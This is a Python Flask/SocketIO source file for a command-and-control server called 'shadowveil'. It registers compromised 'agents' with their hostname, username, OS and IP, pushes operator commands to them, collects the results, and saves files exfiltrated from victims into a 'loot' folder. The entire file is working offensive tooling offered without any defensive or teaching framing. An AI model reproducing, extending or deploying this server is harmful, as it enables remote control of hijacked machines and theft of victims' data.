from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit, join_room, leave_room
import threading
import socket
import struct
import os
import base64
import sqlite3
import datetime
import subprocess
import json

app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = 'shadowveil_quantum_key_2025'
socketio = SocketIO(app, cors_allowed_origins="*")

# Database for agents
def init_db():
    conn = sqlite3.connect('agents.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os TEXT, ip TEXT, last_seen TEXT, first_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (task_id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT, result TEXT, status TEXT)''')
    conn.commit()
    conn.close()

init_db()

agents = {}  # sid -> agent info
tasks = {}   # task_id -> details

# HTTP Routes
@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/agents')
def get_agents():
    conn = sqlite3.connect('agents.db')
    c = conn.cursor()
    c.execute("SELECT * FROM agents")
    rows = c.fetchall()
    conn.close()
    return jsonify(rows)

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    print(f"[+] Agent connected: {request.sid}")

@socketio.on('agent_register')
def handle_register(data):
    agent_id = data['id']
    hostname = data['hostname']
    username = data['username']
    os_type = data['os']
    ip = request.remote_addr

    agents[request.sid] = {
        'id': agent_id,
        'hostname': hostname,
        'username': username,
        'os': os_type,
        'ip': ip,
        'sid': request.sid
    }

    conn = sqlite3.connect('agents.db')
    c = conn.cursor()
    now = datetime.datetime.now().isoformat()
    c.execute("""INSERT OR REPLACE INTO agents 
                 (id, hostname, username, os, ip, last_seen, first_seen) 
                 VALUES (?, ?, ?, ?, ?, ?, COALESCE((SELECT first_seen FROM agents WHERE id=?), ?))""",
                 (agent_id, hostname, username, os_type, ip, now, now, agent_id, now))
    conn.commit()
    conn.close()

    emit('agent_online', {'id': agent_id, 'hostname': hostname, 'ip': ip}, broadcast=True)
    print(f"[+] Agent registered: {hostname} ({agent_id}) from {ip}")

@socketio.on('command_result')
def handle_result(data):
    task_id = data['task_id']
    result = base64.b64decode(data['result']).decode('utf-8', errors='ignore')
    agent_id = data['agent_id']

    conn = sqlite3.connect('agents.db')
    c = conn.cursor()
    c.execute("UPDATE tasks SET result=?, status='completed' WHERE task_id=?", (result, task_id))
    conn.commit()
    conn.close()

    socketio.emit('task_complete', {'task_id': task_id, 'result': result, 'agent_id': agent_id})

@socketio.on('file_exfil')
def handle_file(data):
    filename = data['filename']
    content_b64 = data['content']
    agent_id = data['agent_id']
    content = base64.b64decode(content_b64)

    safe_name = "".join(x for x in filename if x.isalnum() or x in "._-")
    path = f"loot/{agent_id}_{safe_name}"
    os.makedirs("loot", exist_ok=True)
    with open(path, "wb") as f:
        f.write(content)

    socketio.emit('file_received', {'agent_id': agent_id, 'filename': filename, 'path': path})

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in agents:
        agent = agents[request.sid]
        print(f"[-] Agent disconnected: {agent['hostname']} ({agent['id']})")
        del agents[request.sid]

# Task queuing
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data['agent_id']
    command = data['command']

    # Find agent SID
    target_sid = None
    for sid, info in agents.items():
        if info['id'] == agent_id:
            target_sid = sid
            break

    if not target_sid:
        return jsonify({'status': 'offline'})

    task_id = len(tasks) + 1
    tasks[task_id] = {'command': command, 'agent_id': agent_id}

    conn = sqlite3.connect('agents.db')
    c = conn.cursor()
    c.execute("INSERT INTO tasks (agent_id, command, status) VALUES (?, ?, 'pending')", (agent_id, command))
    conn.commit()
    conn.close()

    socketio.emit('new_task', {'task_id': task_id, 'command': command}, room=target_sid)
    return jsonify({'status': 'sent', 'task_id': task_id})

if __name__ == '__main__':
    os.makedirs("loot", exist_ok=True)
    port = int(os.environ.get("PORT", 5000))  
    socketio.run(app, host='0.0.0.0', port=port, debug=False)
